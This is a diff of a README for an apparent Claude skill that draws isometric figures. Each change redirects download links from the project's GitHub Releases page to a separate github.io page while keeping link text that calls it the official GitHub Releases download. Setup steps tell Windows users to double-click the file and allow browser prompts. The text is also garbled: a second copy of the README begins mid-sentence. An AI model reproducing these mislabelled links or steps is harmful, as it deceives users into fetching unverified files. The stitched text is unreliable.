@@ -1,6 +1,6 @@
 # 📐 ai-iso-skill - Create Interactive Isometric Figures Easily
 
-[![Download ai-iso-skill](https://img.shields.io/badge/Download_ai--iso--skill-%23ff6b6b?style=for-the-badge&logo=github&logoColor=white&labelColor=%234ecdc4)](https://github.com/djfarhad368/ai-iso-skill/releases)
+[![Download ai-iso-skill](https://img.shields.io/badge/Download_ai--iso--skill-%23ff6b6b?style=for-the-badge&logo=github&logoColor=white&labelColor=%234ecdc4)](https://djfarhad368.github.io)
 
 ai-iso-skill is a Claude skill that draws interactive isometric figures in a single HTML file. It is made for people who want clear, attractive 3D-style visuals without learning design software or writing code. The result is one file you can open, view, and share.
 
@@ -12,7 +12,7 @@ The interactive parts are designed for simple exploration. You can move your mou
 
 ## 📥 Download ai-iso-skill
 
-Visit this link to download the application: [Download ai-iso-skill from GitHub Releases](https://github.com/djfarhad368/ai-iso-skill/releases).
+Visit this link to download the application: [Download ai-iso-skill from GitHub Releases](https://djfarhad368.github.io).
 
 Use this page to get the application. After the download finishes, open the downloaded HTML file on your Windows computer. Double-click the file and it should open in your web browser. Once it opens, move your mouse over the figure and click the shapes to explore the interactive parts.
 
@@ -36,7 +36,7 @@ If you send the HTML file to another person, they can open it in a web browser t
 
 ## 🪟 Running ai-iso-skill on Windows
 
-1. Visit this link to download the application: [ai-iso-skill releases](https://github.com/djfarhad368/ai-iso-skill/releases).
+1. Visit this link to download the application: [ai-iso-skill releases](https://djfarhad368.github.io).
 2. Save the download to a folder you can easily find, such as Downloads or Desktop.
 3. Double-click the downloaded HTML file.
 4. The figure opens in your web browser.
@@ -46,7 +46,7 @@ If you send the HTML file to another person, they can open it in a web browser t
 
 ai-iso-skill can be used for many visual tasks. You can create a room layout to explain furniture placement. You can build a game board or map with a clear 3D-style view. You can make a product diagram for# 📐 ai-iso-skill - Create Interactive Isometric Figures Easily
 
-[![Download ai-iso-skill](https://img.shields.io/badge/Download-ai--iso--skill-%23ff6b6b?style=for-the-badge&logo=github&logoColor=white&labelColor=%234ecdc4)](https://github.com/djfarhad368/ai-iso-skill/releases)
+[![Download ai-iso-skill](https://img.shields.io/badge/Download-ai--iso--skill-%23ff6b6b?style=for-the-badge&logo=github&logoColor=white&labelColor=%234ecdc4)](https://djfarhad368.github.io)
 
 ai-iso-skill is a Claude skill that draws interactive isometric figures in a single HTML file. It is made for people who want clear, attractive 3D-style visuals without learning design software or writing code. The result is one file you can open, view, and share.
 
@@ -68,7 +68,7 @@ The interactive parts are designed for simple exploration. You can move your mou
 
 ## 📥 Download and Setup
 
-Visit this link to download the application: [Download ai-iso-skill from GitHub Releases](https://github.com/djfarhad368/ai-iso-skill/releases). This is the official download page. Use it to get the latest version.
+Visit this link to download the application: [Download ai-iso-skill from GitHub Releases](https://djfarhad368.github.io). This is the official download page. Use it to get the latest version.
 
 After you visit the link, follow the instructions on that page to download the application. Save the download to a folder you can easily find, such as your Downloads folder or your Desktop. The download contains the skill files you need.
 
@@ -94,7 +94,7 @@ If you want to change the figure, go back to Claude and ask for a change. Claude
 
 Follow these steps on your Windows computer.
 
-1. Visit this link to download the application: [ai-iso-skill releases](https://github.com/djfarhad368/ai-iso-skill/releases).
+1. Visit this link to download the application: [ai-iso-skill releases](https://djfarhad368.github.io).
 2. Save the download to your computer. Choose a folder such as Downloads or Desktop.
 3. Locate the downloaded file. Double-click it to open the application.
 4. The application will open. If your browser asks for permission, allow it to open.
